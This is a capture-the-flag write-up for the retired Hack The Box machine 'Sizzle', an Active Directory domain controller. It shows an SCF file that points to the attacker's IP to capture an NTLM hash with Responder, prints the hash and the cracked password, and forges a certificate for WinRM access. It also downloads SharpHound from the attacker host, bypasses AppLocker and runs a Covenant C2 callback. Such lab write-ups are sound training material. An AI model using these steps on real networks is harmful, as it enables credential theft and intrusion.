# Sizzle

This is the write-up for the box Sizzle that got retired at the 1st June 2019.
My IP address was 10.10.14.6 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.103    sizzle.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/sizzle.nmap 10.10.10.103
```

```markdown
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2019-10-12T17:07:17
|_Not valid after:  2020-10-11T17:07:17
|_ssl-date: 2019-10-12T17:21:36+00:00; +1s from scanner time.
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-10-12T17:21:35+00:00; 0s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2019-10-12T17:07:17
|_Not valid after:  2020-10-11T17:07:17
|_ssl-date: 2019-10-12T17:21:35+00:00; 0s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2019-10-12T17:07:17
|_Not valid after:  2020-10-11T17:07:17
|_ssl-date: 2019-10-12T17:21:36+00:00; +1s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2019-10-12T17:07:17
|_Not valid after:  2020-10-11T17:07:17
|_ssl-date: 2019-10-12T17:21:35+00:00; 0s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=10/12%Time=5DA20AF2%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03");
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Full TCP port scan finds additional ports:
```markdown
PORT      STATE SERVICE
(...)
5985/tcp  open  wsman
5986/tcp  open  wsmans
9389/tcp  open  adws
47001/tcp open  winrm
```

## Checking FTP (Port 21)

Anonymous login is allowed but we see nothing in there and we can't upload anything.

## Checking HTTP (Port 80)

The web page shows a GIF of sizzling bacon and nothing more valuable on here.

## Checking DNS (Port 53)

Nslookup does not give us any information about other servers but on the Nmap scan we see the domains **HTB.LOCAL** and **sizzle.htb.local** that we should check.
Scanning for the domain **HTB.LOCAL** does give us an IPv6 address and scanning for **sizzle.htb.local** gives us the exact same thing, which means this box is the domain controller for this domain:
```markdown
> server 10.10.10.103
Default server: 10.10.10.103
Address: 10.10.10.103#53
> sizzle.htb.local
Server:         10.10.10.103
Address:        10.10.10.103#53

Name:   sizzle.htb.local
Address: 10.10.10.103
Name:   sizzle.htb.local
Address: dead:beef::68ff:77d6:ed8d:ba49
```

Let's put these domain names into our hosts file.

## Checking HTTPS (Port 443)

On this web page we see the same as on port 80 but we can analyze the SSL certificate:
- Common Name (CN): HTB-SIZZLE-CA
  - There is a **Certificate Authority** configured
  - Created on 3rd July 2018

A directory search with _Gobuster_ doesn't find anything valuable.

## Checking LDAP (Port 389)

We will enumerate LDAP with _ldapsearch_:
```markdown
ldapsearch -x -h sizzle.htb.local -s base namingcontexts
```

The output gives us the naming contexts and they are from Active Directory:
```markdown
dn:
namingContexts: DC=HTB,DC=LOCAL
namingContexts: CN=Configuration,DC=HTB,DC=LOCAL
namingContexts: CN=Schema,CN=Configuration,DC=HTB,DC=LOCAL
namingContexts: DC=DomainDnsZones,DC=HTB,DC=LOCAL
namingContexts: DC=ForestDnsZones,DC=HTB,DC=LOCAL
```

Lets see if we can dump anything out of the domain:
```markdown
ldapsearch -x -h sizzle.htb.local -s sub -b 'DC=HTB,DC=LOCAL'
```

It tells us that we can't perform this action because we need to authenticate and can't do anything:
```markdown
# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v3839
```

## Checking SMB (Port 445)

SMB enumeration:
```markdown
smbmap -H 10.10.10.103 -u null
smbclient -N -L //10.10.10.103
```

Combining the output of the two commands we can see the permissions and comments on the shares:

```markdown
Disk                         Permissions            Comment
----                         -----------            -------
ADMIN$                       NO ACCESS              Remote Admin
C$                           NO ACCESS              Default Share
CertEnroll                   NO ACCESS              Active Directory Certificate Services Share
Department Shares            READ ONLY              -
IPC$                         READ ONLY              Remote IPC
NETLOGON                     NO ACCESS              Logon server share
Operations                   NO ACCESS              -
SYSVOL                       NO ACCESS              Logon server share
```

The only share we can read is _Department Shares_ so lets see what we find there:
```markdown
smbclient -N '//10.10.10.103/Department Shares'
```

![Folders in the share](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_smb-shares.png)

There are so many folders of different departments that I will mount this share locally:
```markdown
mount -t cifs -o vers=1.0 '//10.10.10.103/Department Shares' /mnt/smb
```

Then we search for all files:
```markdown
find . -ls | tee ~/root/Documents/htb/boxes/sizzle/smbrecon.txt
```

The most files are found in the folder **/ZZ_ARCHIVE**. Reviewing these files shows that all of them are filled with NULL bytes and useless.

We can enumarate the **Access Control List** permissions with a tool called **smbcacls** for every folder:
```markdown
smbcacls -N '//10.10.10.103/Department Shares' /Users
```
```markdown
REVISION:1
CONTROL:SR|DI|DP
OWNER:BUILTIN\Administrators
GROUP:HTB\Domain Users
ACL:Everyone:ALLOWED/0x0/READ
ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL
ACL:BUILTIN\Administrators:ALLOWED/OI|CI|I/FULL
ACL:Everyone:ALLOWED/OI|CI|I/READ
ACL:NT AUTHORITY\SYSTEM:ALLOWED/OI|CI|I/FULL
```

In the case of the folder _Users_ the owner is the local Administrators group and everyone is allowed to read it.
Lets look for all of them with a loop:
```markdown
for i in $(ls); smbcacls -N '//10.10.10.103/Department Shares' $i; done
```

After this finishes it is interesting to see that we can write to all folders in _User_ and most importantly to the user _Public_.

### SCF File Attack

By doing a [SCF (Shell Command Files) File Attack](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/) we can create an alias for an icon that shows to our IP address and when Windows Explorer opens that directory, tries to pull the icon and attempts to authenticate, we will take the hash of that authentication.

The file I created is called _steal.scf_ and has this contents:
```markdown
[Shell]
Command=2
IconFile=\\10.10.14.6\share\stealhash.ico
[Taskbar]
Command=ToggleDesktop
```

Start **Responder** and then upload that file to **\Users\Public\**:
```markdown
responder -I tun0
```

After waiting for a while we get a response back from the user _amanda_ and her hash:
```markdown
[SMB] NTLMv2-SSP Client   : 10.10.10.103
[SMB] NTLMv2-SSP Username : HTB\amanda
[SMB] NTLMv2-SSP Hash     : amanda::HTB:b2b4d4963b3d164a:89D8272C0215903365A2CF72327C5F6A:0101000000000000C0653150DE09D2014CB331DE3128B7C2000000000200080053004D004200330001001E00570049004E002D00500052004
800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C0005001400
53004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000100000000200000ADADF1C95E1BD9795395E1D1CC5818E9BFFAD50666BD7762FDC1BACAFA5E37EB0A00100000000000000
00000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003600000000000000000000000000
```

Cracking the hash with **hashcat**
```markdown
hashcat -m 5600 amanda.hash /usr/share/wordlists/rockyou.txt
```

The cracked password is:
> Ashare1972

### Checking SMB with authentication

Lets see if we have more access on the SMB shares:
```markdown
smbmap -u amanda -d htb.local -p 'Ashare1972' -H 10.10.10.103
```
```markdown
Disk                           Permissions
----                           -----------
ADMIN$                         NO ACCESS
C$                             NO ACCESS
CertEnroll                     READ ONLY
Department Shares              READ ONLY
IPC$                           READ ONLY
NETLOGON                       READ ONLY
Operations                     NO ACCESS
SYSVOL                         READ ONLY
```

Now we additionally have read access on _CertEnroll_, _NETLOGON_ and _SYSVOL_.

## Checking LDAP with authentication

Lets get some information from LDAP with the user authentication:
```markdown
ldapsearch -x -h sizzle.htb.local -D 'amanda@HTB.local' -w 'Ashare1972' -b 'DC=HTB,DC=LOCAL'
```

Now it is dumping a lot of information from the base and with a LDAP query we can look for users in the _Domain Admins_ group:
```markdown
ldapsearch -x -h sizzle.htb.local -D 'amanda@HTB.local' -w 'Ashare1972' -b 'DC=HTB,DC=LOCAL' "(&(ObjectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=htb,DC=local))"
```

There are two users in this group:
- CN=Administrator,CN=Users,DC=HTB,DC=LOCAL
- CN=sizzler,CN=Users,DC=HTB,DC=LOCAL

## Checking the Certificate Authority on HTTP

The default path for Certificate Authorities on webservers is **/certsrv** which gives us an 401 (Not Authorized) status code normally.
But now we can authenticate with the user _amanda_ and see the **Microsoft Active Directory Certificate Services** in which we can request certificates.

The certificate is needed for certificate authentication because the box does not allow password authentication to use the other services.

```markdown
# Generate key:
openssl genrsa -aes256 -out amanda.key 2048

# Generate certificate signing request:
openssl req -new -key amanda.key -out amanda.csr
```

Now we copy the contents of _amanda.csr_ and let it sign from the CA:

![Request a certificate](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_adcs_1.png)

![Advanced certificate request](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_adcs_2.png)

![Paste contents of CSR](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_adcs_3.png)

![Download certificate as Base64-decoded file](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_adcs_4.png)

We now have a certificate that is signed by the CA using the _amanda_ user. Verifying this:
```markdown
openssl x509 -in amanda.cer -text
```
```markdown
Certificate:                                                                                         
    Data:                                                                                                                                                                                                  
        Version: 3 (0x2)                                                                             
        Serial Number:                                                                               
            69:00:00:00:16:88:87:cc:5f:6c:1a:a4:ba:00:00:00:00:00:16                                 
        Signature Algorithm: sha256WithRSAEncryption                                                 
        Issuer: DC = LOCAL, DC = HTB, CN = HTB-SIZZLE-CA        
        Validity                                                                                     
            Not Before: Oct 12 20:24:02 2019 GMT                                                     
            Not After : Oct 11 20:24:02 2020 GMT                                                     
        Subject: DC = LOCAL, DC = HTB, CN = Users, CN = amanda                                       
        Subject Public Key Info:
        (...)
```

### Using Windows Powershell Remoting (Port 5985)

As the full TCP port scan showed the ports 5985 and 5986 are open we will use these services for **Windows Powershell Remoting**.
We will use a modified version of this [WinRM Ruby script](https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb) that allows us to start a shell on the box. 

The modified script can be found in this folder with the name _psremote.rb_ in which the authentication method will be with the certificate that we created before.

```markdown
ruby psremote.rb
```

Running the script gives us a shell on the box as user _htb\amanda_!

## Information Gathering on the domain

Since we know that this is a domain controller and we have a session now, we should run **Bloodhound** to gather information about the domain. First we need to upload the ingestor **SharpHound.exe** onto the box and then we can execute it:

```markdown
IWR -Uri http://10.10.14.6/SharpHound.exe -OutFile SharpHound.exe
```

When trying to run it we see that a policy is blocking it so we need to [bypass AppLocker](https://github.com/api0cradle/UltimateAppLockerByPassList) by executing it in a directory that is whitelisted by default like _C:\Windows\Temp_ for example.

```markdown
.\SharpHound.exe
```

This creates a ZIP file that we need on our machine to analyze it with Bloodhound but it does not execute like it should, so we execute it with a C2 Framework.

### Starting a C2 Framework

As we will need to communicate a lot with the box we will load up the C2 Framework **Covenant**.

Installing it with Docker:
```markdown
docker build -t covenant .

docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v $(pwd)/Data:/app/Data covenant --username tester
```

After that we get a web server on localhost on port 7443 thats our C2 framework.

This is the Covenant Dashboard:

![Covenant Dashboard](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_cv-dashboard.png)

Starting a Listener:

![Covenant create Listener](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_cv-listener.png)

Generating a Binary Launcher:

![Covenant start Launcher](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_cv-launcher.png)

After executing that launcher.exe we get a callback and this can be seen on Grunts:

![Covenant start Grunt](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_cv-grunt.png)

Clicking on the Grunt name and then Interact:

![Covenant interacting with Grunt](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_cv-grunt-2.png)

With the command _help_ we can see every module we can execute like **Seatbelt, Rubeus, Mimikatz, Kerberoast** and much more.

But we want to start the SharpHound.exe:

![Covenant executing SharpHound](https://kyuu-ji.github.io/htb-write-up/sizzle/sizzle_cv-grunt-3.png)

And now we can download the generated ZIP file and analyze it with BloodHound.

### Analyzing BloodHound



